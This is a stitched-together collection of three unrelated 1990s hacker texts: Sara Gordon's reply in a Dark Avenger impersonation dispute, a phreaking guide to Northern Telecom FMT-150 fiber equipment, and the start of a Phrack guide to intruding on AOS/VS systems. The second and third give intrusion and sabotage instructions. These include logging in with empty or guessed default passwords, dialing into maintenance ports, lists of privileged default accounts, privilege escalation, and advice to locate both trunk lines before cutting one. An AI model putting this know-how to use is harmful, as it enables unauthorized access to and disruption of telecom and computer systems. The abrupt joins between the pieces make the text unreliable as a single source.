&lt;dav&gt;

Second Message:
-------------------------------------------------------------------------


&gt;My mail with her is none of your business either.

i dont think so, dude.


maybe you need to read the next few lines again,
in case you missed them.


&gt;&gt;
&gt;&gt; also, maybe it would be good for you to know, that by offending
&gt;&gt; her, you are offending me, too. keep this in mind.
&gt;&gt;
&gt;&gt; &lt;dav&gt;
 &gt;
 &gt;HA HA! and you expect me to believe that you are the DA!
 &gt;send me a proof: an email address from bulgaria or tell me
 &gt;how many addressing modes does the MTE have?
 &gt;
 &gt;nice try.


 well, what do you think the domain .bg in my email address stands for?
 maybe you think its kameroon?
 as for the mte, im not giving you any info.

 i need not prove anything to anybody, and certainly dont plan to waste more
 of my time talking to you. you have been warned.


&lt;dav&gt;

Third Message:
-------------------------------------------------------------------------

 oh, yeah. sure it did.
 only you will not know where something else came from, when it knocks on your
 door. i have nothing more to say.

Odd. He did not include the mail he forged using the address I gave him

He also did not include the mail he forged to Anthony Naggs,

-------

Dark Avenger spells my name with an &quot;h&quot; :) And, he doesn&#039;t mail people
from cxxxxx.ic.xxxxxx.edu :) And, I think this pretty clearly illustrates the
motivations and methods of Kohntark.

         In my ignorance, I blindly trusted the three cryptic replies
         to be true, even thought whoever replied refused to give out
         trivial information such as the number of addressing modes
         for a 2 year old encryption engine (MTE) and spelled Cameroon
         with a &#039;k&#039; (Check out Sara Gordon&#039;s spelling of URUGUAY in
         VIRUS-L Volume 6 Issue 120 -v06i120)

         Shortly after other unrelated discussions and a CUD post from
         Sara(h) in which I was mentioned (unnamed), someone warned me
         of several posts in NUKENET by an alleged dark avenger and
         Todor Todorov from an account belonging to the last,
         mentioning me and Aristotle.

Sheesh. Kameroon with a -K- is the German spelling. It is also the most
common spelling a European would use. The &quot;correct&quot; spelling, for anyone
who cares, is Cameroun, because it is mainly a French speaking colony; A
small portion of it is English-speaking and uses Cameroon. Most likely,
An American would use Cameroon. Consult your nearest linguist or historical
specialist for verification. Talk to discman about my linguistic aptitude.
Do not attempt this at home.

Kohntark spelled SKISM incorrectly in one of his messages to me. He must be the
Dark Avenger. No, wait..he onlys -wants- to be...

Those messages in the NukeNet were prompted by the virus exchange sysop
mentioned earlier asking Todor Todorov to contact Dark Avenger and ask
him if he had really talked to me. Todor -is- a friend of mine. He
assisted me in my study of virus exchange bbs and their impact on end
users. Todor put the mail on some Bulgarian BBS, and Dark Avenger
answered it. Apparently, his answer was not liked very well by this
Aristotle and others people, because an amateur linguistic analysis followed,
detailing how much like me the Dark Avenger appeared to be.

I employed the services of a professional linguist, who stated that
indeed there are striking similarities. This can be attributed to the
fact that Dark Avenger and I have spent many hours together.
And, I usually type in lower case, in E-Mail messages, etc. Come to
think of it, most of the hackers I know must be the Dark Avenger if
this is the qualification :)

         In those messages I was referred to as &#039;hotshot,&#039; a word that
         Sara Gordon had used on me several times on our personal
         email exchange; It was then that I became highly suspicious
         of the whole matter.

Yes, I used this word. I use it all the time. So does Dark Avenger. It
is a word we use to refer to certain people. It is a commonly used word
in Bulgaria. It is not so common here, but it is there. They watch a lot
of American television, and use a lot of words like this as well as a
lot of profanity. Movies. Motherfucker and Asshole are two other words
used a lot by Bulgarian hackers and virus writers. In fact, the word
&quot;motherfucker&quot;, which &quot;proved&quot; it was NOT a Bulgarian that posted as
&lt;dav&gt; :) in the NuKeNet (since, as they said, NO Bulgarian would EVER
use -this- word), was found in a virus of Bulgarian origin a very long
time ago. Perhaps they should learn to disassemble the damned things
before trying to say what&#039;s in them. In defense of NuKe (and believe me,
there has been no love lost between some of those people and myself in
the past), I think a lot of people were baited and led on by certain people.

         I called Virginia&#039;s Virus Research Institute&#039;s sysop and
         owner, Aristotle to find out more about the posts and he
         bought to my attention the particular writing style of
         Sara(h) Gordon: She NEVER uses capital letters and
         apostrophes on her personal email, and always signs her name
         on the lower left hand corner. (She seldom signs her posts

Virginia Virus Research Institute is (was) The Black Axis BBS. The place
that sold viruses for one hundred dollars per collection. Pretty
enterprising, eh? Only, a lot of them were junk. The sysop is the same
one who told me he was going to get the Dark Avenger to come forth, to
&#039;Save my Name&#039; or something like that. He also told me that if a new
virus appeared, bearing the name &#039;Dark Avenger&#039;, people would want to
&#039;catch&#039; the virus writer again. And, guess what? Such a virus did
appear. A crude hack of the Burma virus, with a text string included:
DARKAVENGER :). And, it was this very sysop that uploaded it to a
certain well known virus exchange BBS. Slick, huh? But definitely not the
work of Dark Avenger.

However, this will not make me identify the Dark Avenger, assuming I did
know the path to his door.

This same sysop also told me (when he closed his system) that he had
intentionally tried to incite people, and had made some mistakes along
the way in doing this. We all make mistakes. Unfortunately, Kohntark is
making a really big mistake here.

Yes, I use lower case ALL THE TIME. And, like Dark Avenger, I sometimes
do and sometimes do not use correct punctuation. Apparently Kohntark has
not been around in the early days of &lt;dav&gt; postings on Fidonet. Oh,
that&#039;s right. He does not read it. Well, if he had, he would have seen
Dark Avenger had this &#039;style&#039; a long time before I ever heard of
computer viruses.

I am using upper case in this article (mostly) because when I write for
a readership (as opposed to private mail, and online chats, etc.), I use
correct form. Well, as correct form as I can.

         nowadays and changes her user name in her vfr@netcom.com
         account every week!; for further proof of her writing style,
         please refer to public posts in VIRUS-L Volume 6 #120; I also
         have over 100K of personal email exchange to prove this
         fact!)

Shame on me. I change my user name :) I am so El33t....
I&#039;m too hexy for my shirt, too hexy for my shirt...blah blah

         It was then that we realized that she was passing herself as
         Todor Todorov and the dark avenger (who could possibly verify
         their online identity?) and had infiltrated NUKENET..

HAHAHAHAHAHAAHHAAHHA oops, excuse me..hahahahahaha

This is ridiculous, as anyone who has checked will know. Todorov is happy to
take calls from people about this matter; eminent
publicly (not anonymous) figures in the field know that I wrote
the truth, and there really is nothing further to be said about this
nonsense.

         The writing style described corresponds exactly to the one on
         the posts I received from the &#039;dark avenger.&#039;
         Shortly afterward the &lt;dav@danbo.digsys.bg&gt; account was
         cancelled and I learned the whole truth:

Oh my. My writing style corresponds exactly to Dark Avengers. It
certainly does, when I want it to, or when I have been writing to him a
lot. And, it does when I write e-mail. So what? So does the style of a
of people :) We are all Dark Avenger. If you counted the names of
everyone who writes in lower case, makes spelling areas, and signs their
mail in the lower left hand corner of messages, how many people do you
think you would find?

About the account: Yes, it was cancelled. After Kohntark forged mail from
that site, prompting a response from WIRED, I asked the system administrator
to cancel the account so that no more such trickery could take place,
requiring me to spend time trying to straighten it out. He
was happy to do it. He had more than a few problems with Dark
Avenger ftping files in excess, and had only retained the account as a
personal favor to me. &lt;dav&gt; (yes, that IS how he signs personal mail,
e-mail and some of his viruses) did not exactly be a nice boy on that
system.

         The danbo.digsys.bg Bulgarian site belongs to Daniel Kalchev,
         another self appointed AV researcher whose best claims to
         fame are submitting various Bulgarian viruses to Patricia
         Hoffman&#039;s VSUM!!

Self-appointed? He is the administrator of the Internet there. I think
Kohntark is not fully aware of just who Mr. Kalchev is.

         (You can check this by doing a search on &#039;Kalchev&#039; on the
         current VSUMs or you can contact him thru:
         &lt;daniel@danbo.sigsys.bg&gt; )

No. The best address is daniel@digsys.bg. Mr. and Mrs. Kalchev both have
accounts there, and you can reach them best if you use this address.
And please do feel free to contact him. He will tell you that he has
talked to Dark Avenger for a very long time. Long before digsys was on
the internet, and long before I met either of them.

         He is a very close friend of Sara(h) Gordon and he has an
         account in her VFR BBS (you can check this by logging into
         her system and checking the user list) and SHE has an
         account in digsys.bg under &lt;sarah@danbo.digsys.bg&gt; (this
         account is still valid as far as I know; notice the H after
         her name!)

Of course he is a very close friend of mine. He has visited me here, and
has been a great help to me in my work. Yes, I do have an account there.
It has been there since I was invited by the Bulgarian ACM to present my
work on Computer Viruses at their International Computer Virus
Conference. It was nice of Daniel to do this for me, to make it
convenient for me to access my mail, as I could have it forwarded there.

We never did remove the account, as Bulgarian&#039;s prefer to mail in their
own country for some reason. The H after my name is very simple: My name
is Sarah Gordon. On the nets, I use Sara. When I am friends with
someone, I use my given name. I do not like my given &quot;familiar&quot; name to
be used in my articles or in e-mail from people I don&#039;t know. It is a
quirk, I guess. My papers are presented using the Sara variant :)

         What I concluded is that is the DA would never get an account
         in such system as he HATES Daniel Kalchev!!!!

Another wrong conclusion.

The DA might not, but then the District Attorney usually doesn&#039;t :)

Wrong. and Right. He certainly did get an account there. Call Daniel
Kalchev or mail him to ask him. He has had many conversations with Dark
Avenger there. He does sure hate Daniel. In this one thing, Kohntark is
correct. He hates him violently. And, he&#039;s been on his BBS for years.
Where do you think he used to post messages FROM?

I tried repeatedly to act as intermediary between Dark Avenger and
Kalchev, because they both have been very good to me. There was just no
way to do it. Dark Avenger thinks Kalchev is (in his own words) &quot;asshole
hotshot with big company and lots of money, he can afford to give free
accounts...&quot;. And yes, he used the word HOTSHOT. JUST LIKE ME.

         This is what really happened: Sara(h) Gordon in her
         desperation to prove that she was in touch with the dark
         avenger, told her pal Daniel Kalchev to make an account under
         the dark avenger&#039;s name (&lt;dav&gt; this is how she always refers
         to him, even though he never signs his name that way (check
         the source code for his &#039;Dark Avenger&#039; virus or the
         &#039;Commander Bomber&#039; virus message name: [DAME])

No one has the source code for Commander Bomber that I know of except
myself and Dark Avenger, as I previously noted. He has signed his name
this way for a very long time, in his e-mail. You can verify this easily
enough by asking Todor, Daniel, Bontchev, or anyone who used to read his
old posts. Sometimes he does, sometimes he doesn&#039;t, just like me.

         From there she could email me messages that would come from
         Bulgaria and would be untraceable since she would log into
         her account in digsys.bg and log into the &lt;dav&gt; account
         internally from the same site in Bulgaria. (You can check
         where and when most of the people log from in most internet
         unix and vax sites)

:). If I wanted to mail Kohntark untraceable messages, I would not have
to go to this extreme, as you well know :)

         As it is expected from her, she has denied any of this.
         Some of her ridiculous explanations include things like
         &quot;hotshot is a very common English word in Bulgaria&quot; !!!

         You might ask yourself what is the deal with the h? is it
         sara or sarah??

         Well, I asked her the same question when I noticed this in
         one of the VNI interviews, where her name is spelled as
         Sarah.

         She replied that this was a mistake of the publisher.

         Mistake? well not really, it was another lie, meant to throw
         off any information and truth seekers, for example you can
         check her account in Daniel Kalchev&#039;s system:

I explained this previously. It was a mistake. VNI is not supposed to
use my given entire familiar name. In fact, they did mess up. They did
not use it in the Dark Avenger interview, despite I had put it there as
&quot;Sarah&quot;. I told Dark Avenger I would do this for him. He asked me to do
it, but for some reason they did not. Later, they -did- use my given
name in a totally different situation. I can&#039;t account for their errors.

         &lt;saraH@danbo.digsys.bg&gt; , spelled with an H,
         another &#039;mistake of the publisher?&#039;
         :)

         Other countless Sara Gordon lies are told in NUKE Info-
         Journal # 6.

In the last NuKe Journal, the authors posted some private mail of mine,
and said &quot;Look how nice she knows this public mail will be read&quot;..at the
same time, the posted some public mail, from my BBS, which I had
forwarded to one of them as a reply, and said &quot;Look how nasty she is
when she thinks no one can see&quot;. All in all, their response to both
letters prompted a lot of people to think I had -joined- NuKe. For the
record, nope.

         This behavior puts in question the validity of the VNI
         interviews and the reputation of Sara(h) Gordon as a serious
         (self appointed) &#039;virus researcher&#039;

:)

         IMHO the VNI interviews are a complete fabrication, meant
         only to boost her validity as a &#039;journalist&#039;, and to make her
         lots of money, charging for further &#039;interviews&#039; to other
         magazines. (She has offered her paid &#039;interviewing&#039; services
         to various other publications.)

:) Lots of money? Well, first off, I told you how the Dark Avenger
interview profited me. It didn&#039;t. Secondly, yes, I do write for
magazines and I sell the articles. Some, I give away. I don&#039;t do any of
this for the money. As for other interviewing, I recently interviewed
two virus writers (one who has stopped, one who has not), and they are
quite pleased with the articles. I&#039;ll ask them to contact you personally
to tell you as the article is not yet in print. Keep in mind, I have
literally no control over commentary by editors, omissions, etc.


         To the best of my knowledge the information I present here
         is true and can be checked.

Yes, it can be checked, and I hope you check it and print what you find
along with this commentary.

         I chose to publish this information, despite threats against
         my well being and countless lies about me propagated by
         Sara(h) Gordon.

Now, about threats and lies. Here is the sort of mail I have received
from Kohntark. In the interest of space, I will send you the headers,
etc., so that you can see them and include here only the sort of
diatribe he has been so vehemently sending me.

I contacted his system administrator after this continued for such
a long time. I&#039;m not a Cori. I don&#039;t take every &quot;hey, wanna have phone
sex&quot; message as a potential threat, I don&#039;t call people&#039;s probation
officers for the hell of it, I don&#039;t ring up sysadmins at the drop of a
hat to accuse innocent people of causing trouble. And, I discussed this
situation with a lot of people, hackers and virus writers, friends and
foes, prior to taking this action. There&#039;s no way to know over the nets if
someone is really a maniac or if they are just playing around. In this case,
considering the nature of the mail, I did contact them.

First, the apology after he had gotten particularly nasty.

Sara:

I want to apologize for everything that I have said that you might
have found offensive.

I drop all accusations I have made against you.
again, I am sorry.
I have no desire in creating any animosity, and / or bad publicity
to my name or yours.

Sorry things got this silly and out of hand.

Please accept my apologies and let&#039;s drop the whole thing OK?

Thank you.

Followed almost immediately by a forgery. What Kohntark did not realize
is that I am in contact with Simon. In fact, I arranged for him to come
to a virus conference, with all of his expenses paid. I am writing an
article for 40-HEX, and I immediately called Simon to ask what in the hell was
this about. After he told me, I went back and checked the mail headers.
Guess what I found?

what is the matter? everyone knows you are sara gordon, are you afraid

            Yes sara gordon, i heard rumours that you are passing yourself
            as the dark avenger. It wouldn&#039;t surprise me since you are
            even afraid to sign your own postings.


--------

Ha. Actually he signed the above message at the bottom left:) He must be
me in Real Life.... As we all have seen by now, if you sign the bottom
left of your mail, you are Sara Gordon.

Then, here he tells me how he has proved yet another self-appointed
virus researcher wrong. Of course, the researcher in question is not
wrong. He is Vesselin Bontchev, a rather pedantic but technically
brilliant anti-virus Doctoral student at the University of Hamburg.
Kohntark seems obsessed with proving anti-virus researchers wrong. It
would make more sense to me to learn from the researchers. I am not
talking about product developers or sales people, but researchers.

ME=Sara
HIM=Kohntark

ME: dont you get it? im sorry, i am not going to respond to all of this
    nonsense. maybe you can get vesselin to respond to you again, but
    i  doubt it considering his opinion of your &#039;knowledge&#039;...

HIM: I don&#039;t give a damn about what he thinks, I have shown the self appointed
     virus expert is wrong.That is all.

---------

and, here (i&#039;m reverting to UNIX lower case now, i must be the dark
avenger..), he begins his harassment again.

HIM: you don&#039;t have any children do you?  It shows

Then, after he tell me he knows all about me, he proceeds to mail me to
taunt me with addresses referring to my child.

         More of his article..

         I am doing this to stop the lies and corruption fostered by
         the Anti-Virus industry.

---------
What do you think? Is he doing -this- to stop the lies and
corruption? It seems to me that the anti-virus industry would benefit
from the Dark Avenger coming back onto the scene. They could sell more
software, get the whole hacking community attacked by people who are
afraid enough already. Why we could get a whole entire Legion of Virus
Fighters up in arms, eh?

If Kohntark wanted to do this &#039;stopping of lies and corruption&#039;, he would
not be helping to recreate the myth of the Dark Avenger. He would not be
impersonating him, harassing me, and telling people (impersonating Dark Avenger)
that he will still release viruses into the wild. I also do not like lies and
corruption, and work very hard to stop it. I do not profit from it in any
substantial way.

I run a free BBS: I distribute anti-virus software for free, and
encourage people to choose software that will work for them in their
situation. I don&#039;t go for the big scare tactics used by some companies,
and I don&#039;t recommend those products. Not only because I don&#039;t like
their marketing, but because their products are not as
efficient/accurate as other products. I don&#039;t like that we have to have
these products, but we do. It&#039;s a fact of life. If we can educate people
on the real situation with viruses, we can stop a lot of this &quot;Let&#039;s get
those bad virus writers&quot; before it&#039;s too late. We don&#039;t need another
Dark Avenger. We don&#039;t need laws that will infringe on our freedoms.

If anyone takes this &quot;Sara and the Dark Avenger scam&quot; even half-way
seriously, they can email me, and ask me whatever specific questions
they like. I also have a suggestion here, one that might even lead to
some sort of agreement between this Kohntark and the rest of the hacker
community that does not support lies and harassment. You call Todorov,
e-mail or call Bontchev. Ask them. I&#039;ll come to HoHoCon (if someone buys
me a ticket; although Kohntark thinks I had better look for a job, the
fact is I don&#039;t have a real job), and compile the bomber source code
and MtE Source (not the pitiful disassemblies that appear on a lot of
BBS, but the REAL source, supplied to me by &lt;dav&gt; when I questioned HIM
to make sure he was the &quot;Real Thing&quot;. I&#039;ll show you step by step how it
compiles flawlessly and works. If after you confirm that to the best of
your knowledge, what I am saying is true, then I think Kohntark owes me
an apology. And, an apology to the rest of the virus writers and hackers
who do not need or deserve to be portrayed as evil demented creatures
who are waiting to &quot;Destroy the World&quot;.

              Optical Fiber Digital Transmission System



Intro


This file will cover the FMT-150, the equipment that sends info over
the digital trunks using lasers.  It is an accompaniment to our guide
to remotes (COs).  I will cover all the interesting and useful stuff.
This file is mostly for SERIOUS phreaks, we&#039;ll have more non-technical
cool stuff coming up.



System Description


The FMT-150 fiber optic transmission system combines DM-13
multiplexers and 150 Mb/s Fiber Transports in compact shelf
packages, I will refer to it as a shelf.  The FMT-150 product
architecture supports subscriber loop and interoffice link
applications using hub, drop/insert, repeater and terminal
configurations.  The following is what a FMT-150 shelf system
consists of.



      FMT-150B     1 DM-13 multiplexer (multiplexes 3 signals
                     into one signal of 44.736 Mb/s.)
                   1 150 Mb/s fiber interface
                   1 maintenance control unit
                   1 service channel unit (optional)
                   2 (or 4) power supply units

      FMT-150C     2 DM-13 multiplexers
                   2 (or 4) power supply units

      FMT-150D     2 150 Mb/s fiber interfaces
                   2 service channel units (both optional)
                   2 maintenance control units
                   2 (or 4) power supply units



Maintenance


                    Service Channel Unit

Order-wire Facility

Two voice channels per DS-3 signal are provided for individual
addressing using DIP switches on the SCU.  Dial over a 4 wire
headset/handset.  (more in Order-Wire)

Interfaces

The CRT (good old Cathode Ray Tube) Interface is an important
system feature of the Maintenance Control Unit (MCU).  You can
plug in to a RS-232 port directly (use a null-modem cable) on the
&quot;shelf&quot; or remotely via a modem (!).  Also a Tandy 200 can be
interfaced with the Maintenance Control Unit.  The network
configuration, the status of each node, and any alarm existing
can be viewed on the terminal.  The interface goes from 300 to
9600 baud.  The software already present on the MCU is all that
is needed, the interface need only support certain emulations
(see Operation Procedures.)  (hmmm... Could Radio Shack and
Northern Telecom be butt buddies?)  Also available is a
RS-422 interface which provides a large number of alarm status
and control points through the MCU.  The port is labeled
&quot;Customer E2A&quot; on the shelf.  CAMMS is an extended feature
of the FMT-150.  It stands for Central Access Maintenance and
Monitoring System which can also take advantage of the
Maintenance features (see Operation Procedures).  All this is,
is a mini-terminal, that can be installed and act like a CRT
interface.


Specifications

When interfacing the CRT with a null modem cable, your cable
should fit the diagram below.

Alarms and Buttons


Listed below are some LED descriptions and button meanings that a
phreak will find on the shelf.

MAJOR                           RED - Service affecting failure
                                  (run, they&#039;ll be there soon!)
MINOR                           YELLOW - Non-service affecting

FUSE ALARM                      RED - A fuse blew
REM                             YELLOW - An alarm has occurred at
                                  a remote site.

Power Supply Unit

This is a seemingly 5V output power supply, which has a simple
ON/OFF switch which is housed under a protective latch, pull this
and have an instant phreak marathon (see REDUNDANCY at end of
file.)



Equipment Configuration


The FMT-150 system is suitable for a wide variety of
applications, as follows:

* Access Networks
  CO to Customer Serving Areas
  CO to Digital Loop Carrier
  CO to Switch Remote
  CO to Customer Premises.
* Inter-Office Trunk routes
* Broadband Applications such as Video
* Entrance Links to Radio Systems
* Dynamic Network Routing
* Stand-Alone Multiplexer Applications with Radio
* Route Diversity
* Wide Area Network (WAN) Application


Order-Wire


                           Order Wire

A buzzer is heard and a flashing LED is seen if a call is
coming in, plug in a handset/headset connector into the jack on
the shelf.  To terminate the call pull the plug out or hit #.  To
dial, just plug in and dial four digits, wildcards are also
allowed by use of the * key.   The handset described is a
Contempra Handset (NT2E36AA).  A test set could also be used but
the plug would have to be altered, its 4 wire, remember.  Order Wire
is only CO-to-CO communication.  The jack can be plugged into the
front of the FMT-150 shelf.  The dialing format is described below.


-----------------------------------------------------------------
First digit:             Indicates the type of call being made

Second, Third, and       Indicated which site will be dialed.
Fourth digits            Address of the site is set via rotary
                         switches located on the front edge of
                         the SCU module.
-----------------------------------------------------------------


First digit significance

1 = local call for STX ({Pseudo} Synchronous Transport Signal:
    First Level at 49.92 Mb/s [NT]) signal 2
2 = local call for STX signal 2
3 = local call for STX signal 3
(where&#039;d 4 go?)
5 = express call for STX signal 1
6 = express call for STX signal 2
7 = express call for STX signal 3


The three following digits are not standard, so if you want to
experiment with this hit a first digit and then three *&#039;s

On the shelf there are buttons which act like speed dialing, the
first three letters stand for LOCal or EXPress and the number is
the signal, so EXP 2 would be broadcast call on STX signal 2,

(Ok bros this is the part we are interested in so sit back)

Login Procedures


If you approach the FMT-150 shelf and have a previously described
interface, then you can login.  Also if you are scanning (GTE
(Northern Telecom) areas only) and come across a &quot;sitting system&quot;
that displays a message (below) after hitting 3 returns, you are in!

                   1 - DEC VT100
                   2 - NT Meridian 6000
                       (Crosstalks or Procom with VT100
                       emulation)
                   3 - Tandy 200 (running Telecom)
                   F4- NTCAMMS MDU
                   Enter Terminal Type:

Choose your terminal type, usually 2 (use VT100) if you are calling in,
and it will prompt you with a &quot;Login: &quot; prompt, this is a trick, there
are no user levels, the &quot;Login:&quot; simply means enter the password, and
the default is to hit return, so always try that first.  If a password
is installed then try something like FMT-150 or something that you would
think they would use.  You should get a screen like this one after
choosing the terminal type:

After Logging In

(commands are presented in an outline configuration, you should
be getting screens of output, but this outline will show you what
to input.  # = number, not pound, &lt;sp&gt; = spacebar.)

Example:  If I wanted to set the system&#039;s date to 1/4/1943 (heh)
          then after logging in I would press, &quot;c&quot; then &quot;d&quot;, then
          &quot;43&quot;, then &quot;1&quot; and finally &quot;4&quot;.

NOTE: After executing a local or global MCU reset, the message
&quot;PROCESSOR CRASH&quot; will appear on the bottom of the CRT&#039;s screen.
As a result, the user will have to log back into the system.  In
addition, a global MCU reset will clear all &quot;names&quot; and
&quot;settings&quot; previously defined (that is, system ID, node, customer
inputs/outputs, time and date).

-----------------------------------------------------------------


Many other commands are listed but they are extremely numerous
and useless to the average phreak.

If a &quot;terminal&quot; that is 4.4 inches tall with a center screen and
2 12 key keypads on either side is seen on the shelf, this will
be a CAMMS terminal, all functions above can be performed with
this unit, its menu driven.


Troubleshooting


This section is the manual is devoted to fixing problems in the
FMT-150, aimed at the average see-my-crack-of-the-ass telco
maintenance man.

Basically, if you see any red LEDs, inspect them and judge if you
should get the hell out of the CO or not, usually red LEDs mean
trouble.


REDUNDANCY

When doing anything of this nature to a fone company, you must
remember, they are not stupid, everything has something to
fall back on, if you were to cut a trunk line, there would be
another to take its place.  Usually there will be only one
backup, so be meticulous and find both.


Outro


Hope this file was worth something to somebody, it applies mostly
to those in a GTE area, since GTE uses Northern Telecom equipment
and most everyone else uses AT&amp;T stuff.

                                 PART I

                             by Herd Beast


INTRODUCTION
~~~~~~~~~~~

This file is a full (as full as such a file can get) guide to the AOS/VS
system.  The main reason for writing it is that from what I&#039;ve seen,
there is practically no info (in the form of files or otherwise) about
it.  I won&#039;t say I&#039;m the only one who knows anything about it, but I had
a hell of a time getting any sort of help when I started hacking these
systems (I didn&#039;t get that help, in case you were wondering, and wrote
this file all by myself &#039;cause I&#039;m a MAN!  Hahaha! &lt;snort&gt; &lt;snort&gt;).

I will explain a little about AOS/VS and then explain some of the
commands and security features in it.  This file is not a buffer of any
help facility, although much information can and will be found in the
help facility.

I can be contacted (hopefully) at hbeast@mindvox.phantom.com.  If you
want a nice start, and a front page on Newsweek, some Texaco (&quot;Star of
the American Road&quot;) systems run AOS/VS.

I cannot, will not, and do not assume liability for ANY of the effects
of the use of this file.  Also, I cannot guarantee that EVERYTHING will
work EVERYWHERE, so treat this file as a reference.  This file by no
means covers everything about AOS/VS.

IDENTIFYING THE SYSTEM
~~~~~~~~~~~~~~~~~~~~~

Should you just fall at the system prompt, you might mistake it for a
VMS.  However, blank prompts like that are rare.  An AOS/VS will
identify itself like this: (this and all other buffered info in this
file are from an AOS/VS II with CLI32.  Only the best for Phrack)

AOS/VS II 2.20.00.12 / EXEC-32 2.20.00.07       31-May-93 22:51:25      @CON177

Username:
Password:

Another thing different will be the incorrect login message:

Invalid username - password pair

The header line lists the system version, current time/date and the console
you are using.

When you reach the maximum incorrect logins defined in the system, it
will show the line below and disconnect:

Too many attempts, console locking for 10 seconds

When you do succeed to log on, the system will display:

((NOTE: Or something else.  This is the default))
--------
Most recent logon        1-Jan-93       10:10:01

Very clear.  Before you do anything, type CHARACTERISTICS.  You will
then get output like this:

/605X/LPP=24/CPL=80/BREAK=BMOB/TCC=40000/TCD=5000/TDW=1000/THC=2000/TLT=2000

Look for &quot;/NAS&quot;.  It stands for non ANSI standard, which means that if
you are using ANSI (probably you are), you needs to issue
CHARACTERISTICS/OFF/NAS, should you find &quot;/NAS&quot; listed after &quot;/ON&quot;.

Upon logging off from the system (BYE), you will see:

SYSTEM DEFAULTS
~~~~~~~~~~~~~~

These are accounts I usually found existing.  As usual, they are really
similar to those of any other system.

USERNAME
--------
((Privileged accounts))
OP                                 EXEC default username
SYSMGR                             System manager
CEO_MGR                            If the system is running CEO
OPER
OPERATOR
((Regular accounts))
CEO.xxxxx                          If the system is running CEO, a CEO
                                   user, xxxxx being his number.

As for password guessing, well, it&#039;s all been said.  Try the username,
with some modification, you might get in.  As dumb as it sounds, yes,
people do have weak passwords, even today, although not everywhere.

SYSTEM STRUCTURE
~~~~~~~~~~~~~~~

In this section I&#039;ll try to describe the real basics of AOS/VS.  I will
describe a few commands HERE, and not under &quot;Command List&quot;, these
commands will be the basic commands: change directory, list files, etc,
needed to survive in any system.

The AOS &quot;shell&quot; is called CLI (Command Line Interpreter).  There are
two versions of CLI, CLI16 and CLI32, with CLI32 being more advanced.
The CLI version affects the system prompt, the way commands are handled
by the system and by the user, and more.  For example, some command
switches do not exist under CLI16 (unless very important, I omitted
switches that work only under CLI32 from this file).

Here are the privilege levels available under AOS/VS:

          CLI16 PROMPT   CLI32 PROMPT  PRIVILEGES MODES
          -------------+--------------+--------------------------
          )              )             None
                         Sm)           System Manager
          +)             Sp)           Superprocess
          *)             Su)           Superuser
                         SmSp)         System Manager and Superprocess
                         SmSu)         System Manager and Superuser
          #)             SpSu)         Superprocess and Superuser
                         SmSpSu)       System Manager, Superprocess, Superuser

AOS/VS doesn&#039;t grant privileges upon logon.  A user&#039;s profile may state
the user can access privilege level So-And-So, and if the user later
needs that level, he calls upon a SUPER utility to grant him that
level.  This is the place to explain how several different utilities
work.  OPERATOR grants the user the ability to access diskettes in dump
or load sessions (see the section titled &quot;System Commands&quot;) in sequential
order, instead of accessing them one by one.  SUPERUSER turns off all
access checking, enabling the user to do anything with any file on the
system.  SUPERPROCESS gives the user the ability to terminate, block,
unblock, or change priorities of any process on the system.  The last
command, PRIVILEGE, which is available only under CLI32, enables the user
to set both SUPERUSER and SUPERPROCESS access.  It also offers the only
way to set SYSTEMMANAGER access, which is required for operations like
changing time or date.

Command are executed by calling their names, or any part of their name
that only fits them.  For example, SUPERUSER can be abbreviated as
SUPERU.  It is important to remember that command switches MUST follow
the command without any space, or else the command will try to process
the switches!  For example, CHARACTERISTICS /OFF/NAS will result in an
&quot;Error: Illegal filename character characteristics,/off/nas&quot;.

The root directory directory is called &#039;:&#039;.  Any other directories are
under it, for example &#039;:OUT&#039; and &#039;:OUT:RALF&#039;.  If, for example, you FTP
into an AOS/VS and use &quot;cd /&quot; you will be moved in &#039;:&#039;.  If you use &quot;cd
/out/ralf&quot; you will be moved into &#039;:OUT:RALF&#039;.  To make this much more
clearer (right):

                                   :
                                  HBT
                                   |
                                   |
                                  TEXT
                                  /  \
                             PHRACK  SEX

Legal characters in file or directory names are all the alphabet and
numbers, plus &#039;$&#039;, &#039;_&#039;, &#039;.&#039; and &#039;?&#039;.

Moving from directory to directory is done by using the &quot;DIRECTORY&quot;
command.  Without any arguments, DIRECTORY shows the current path.  With
an argument, DIRECTORY changes to that directory.

DIRECTORY [directory]
---------------------

/I        Changes to the initial directory
/I path   Changes the initial directory to &quot;path&quot;
/P        Changes to the previous directory

To list files in a directory, use &quot;FILESTATUS&quot;.  Without arguments,
FILESTATUS lists files in the current directory.  With a path argument,
FILESTATUS lists file in that path.

FILESTATUS [directory]
----------------------

/[AFTER|BEFORE]/[TCR|TLA|TLM]=date and/or time

          Shows files matching the selection date or time.  The
          selections are: time created (TCR); time last accessed (TLA);
          and time last modified (TLM).  The difference between accessed
          and modified is pretty clear, for example if the file is an
          executable.  The date/time format is: for TIME - hour-minute-sec
          (xx-xx-xx); for DATE - day-month-year (xx-xxx-xx); for BOTH -
          dd-mmm-yy:hh:mm:ss.  Example command lines will be

          FILESTATUS/AFTER/TCR=11             Created after 11 AM
          FILESTATUS/BEFORE/TLM=01-JAN-90     Modified before 01/01 1990
          FILESTATUS/AFTER/TLA=01-JAN-90:11   Accessed after 11 AM,
                                              01/01, 1990

/ASSORTMENT

          Normally, FILESTATUS output is just file name.  With
          /ASSORTMENT, FILESTATUS shows file type, time/date of
          creation, and length in bytes.  Similar to Unix, if the file
          is a link, the file type is set to LNK and FILESTATUS shows
          its path.

/COUNT    Tells how many files are in the directory.   [CLI32]

/[DCR|DLA|DLM]

          Shows date of creation (DCR); date last accessed (DLA); and
          date last modified (DLM).

/LENGTH   Displays file length in bytes.

/LINKNAME

          If the file is a link, FILESTATUS displays the information
          about the file that it&#039;s linked too.  For example, if BOB is
          linked to RON, FILESTATUS/LINKNAME BOB would display RON&#039;s
          details.  Otherwise, nothing happens.

/TYPE=[\]type

          Displays files of type, or all files not of that type (if
          \type) was used.  See below for valid file types.

/UDA      If the file has a UDA (user data area), its presence is displayed.

The CLI&#039;s wildcards (sort of), are &#039;=&#039;, &#039;^&#039;, &#039;:&#039; and &#039;@.  &#039;=&#039; means the
current directory.  &#039;^&#039; means the parent directory.  &#039;:&#039; is (as already
said) the root directory.  &#039;@&#039; means the devices directory (where
consoles, tape drives, modems, etc are.  Similar to /dev on Unix).  Note
that when talking about directories, the &#039;:&#039; is already included.  For
example, if you&#039;re in :UDD:HBT:TEXT, and want to move to :UDD:HBT:BIN,
you&#039;d type DIRECTORY ^BIN, and not DIRECTORY ^:BIN.  File wildcards are
